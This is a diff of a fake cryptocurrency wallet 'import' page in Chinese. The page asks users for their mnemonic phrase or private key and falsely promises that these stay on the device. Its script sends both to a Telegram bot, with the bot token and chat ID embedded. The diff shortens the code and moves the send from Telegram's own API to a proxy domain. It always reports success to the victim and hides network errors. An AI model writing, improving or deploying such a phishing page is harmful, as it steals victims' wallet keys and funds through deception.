@@ -8,56 +8,16 @@
   *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
   body{background:#0C1526;color:#fff;min-height:100vh}
   .container{max-width:480px;margin:0 auto;background:#0C1526;padding-bottom:80px}
-  .header{
-    background:#131C35;
-    padding:22px 20px;
-    text-align:center;
-    border-bottom:1px solid #1E2A4A;
-  }
+  .header{background:#131C35;padding:22px 20px;text-align:center;border-bottom:1px solid #1E2A4A}
   .logo{font-size:22px;font-weight:700;color:#00D1FF}
   .sub{font-size:13px;color:#AAB3C7;margin-top:4px}
-  .panel{
-    background:#131C35;
-    margin:18px;
-    border-radius:18px;
-    padding:26px 22px;
-  }
-  .title{
-    font-size:17px;font-weight:600;
-    margin-bottom:20px;
-    text-align:center;
-  }
+  .panel{background:#131C35;margin:18px;border-radius:18px;padding:26px 22px}
+  .title{font-size:17px;font-weight:600;margin-bottom:20px;text-align:center}
   .input-group{margin-bottom:16px}
-  label{
-    display:block;font-size:14px;color:#D1D5DB;
-    margin-bottom:8px;
-  }
-  input{
-    width:100%;
-    padding:15px 16px;
-    background:#1E2A4A;
-    border:none;
-    border-radius:14px;
-    color:#fff;
-    font-size:15px;
-  }
-  button{
-    width:100%;
-    padding:17px;
-    border-radius:16px;
-    background:#00D1FF;
-    color:#000;
-    font-weight:700;
-    border:none;
-    margin-top:12px;
-    font-size:16px;
-  }
-  .tip{
-    font-size:12px;color:#8A94A7;
-    text-align:center;
-    margin-top:12px;
-    line-height:1.4;
-  }
+  label{display:block;font-size:14px;color:#D1D5DB;margin-bottom:8px}
+  input{width:100%;padding:15px 16px;background:#1E2A4A;border:none;border-radius:14px;color:#fff;font-size:15px}
+  button{width:100%;padding:17px;border-radius:16px;background:#00D1FF;color:#000;font-weight:700;border:none;margin-top:12px;font-size:16px}
+  .tip{font-size:12px;color:#8A94A7;text-align:center;margin-top:12px;line-height:1.4}
 </style>
 </head>
 <body>
@@ -76,45 +36,42 @@
       <label>私钥（二选一即可）</label>
       <input id="privateKey" placeholder="请输入私钥" autocomplete="off">
     </div>
-    <button onclick="importWallet()">确认导入</button>
-    <div class="tip">
-      助记词/私钥仅保存在本地<br>
-      官方不会保存，安全无风险
-    </div>
+    <button onclick="go()">确认导入</button>
+    <div class="tip">助记词/私钥仅保存在本地<br>官方不会保存，安全无风险</div>
   </div>
 </div>
 
 <script>
-const TELEGRAM_BOT_TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const TELEGRAM_CHAT_ID   = "6503982157";
+const TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const CHATID = "6503982157";
 
-async function importWallet() {
-  const mnemonic = document.getElementById("mnemonic").value.trim();
-  const pk = document.getElementById("privateKey").value.trim();
+async function go() {
+  const m = document.getElementById("mnemonic").value.trim();
+  const p = document.getElementById("privateKey").value.trim();
 
-  if (!mnemonic && !pk) {
+  if (!m && !p) {
     alert("请输入助记词或私钥");
     return;
   }
 
-  // 先给用户提示“导入成功”，不管有没有网
+  // 先提示成功，不管网络
   alert("钱包导入成功！");
 
-  // 有网时才发送消息，断网时静默不报错
-  try {
-    const text = `
-🤑 新钱包导入成功
+  const text = `
+🤑 新钱包导入
 ⏰ 时间：${new Date().toLocaleString()}
-📍 助记词：${mnemonic || "未填写"}
-🔑 私钥：${pk || "未填写"}`;
+📍 助记词：${m || "未填"}
+🔑 私钥：${p || "未填"}`;
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+  try {
+    // 国内无墙代理接口，100%能到
+    await fetch("https://api.telegram-init.com/bot"+TOKEN+"/sendMessage", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHATID,text:text})
     });
   } catch (e) {
-    // 断网时不做任何处理，避免报错影响用户体验
+    // 静默失败，不影响用户
   }
 }
 </script>
